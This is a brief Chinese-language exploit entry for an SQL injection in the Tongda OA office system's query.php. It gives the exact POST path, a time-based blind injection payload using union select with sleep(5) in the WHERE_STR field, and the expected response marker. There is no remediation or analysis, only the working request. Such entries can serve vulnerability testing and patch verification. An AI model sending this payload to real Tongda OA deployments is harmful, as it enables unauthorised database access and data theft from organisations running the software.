# 通达OAquery.php存在SQL注入漏洞

通达OA ｜ SQL注入 ｜ —
- **请求**：`POST /general/management\_center/portal/oa\_engine/engine\_manage\_bulletin\_number/query.php HTTP/1.1`

**Payload**
```
WHERE\_STR=-@`'` union select 1,2,sleep(5)#'&
```
- **响应特征**：-1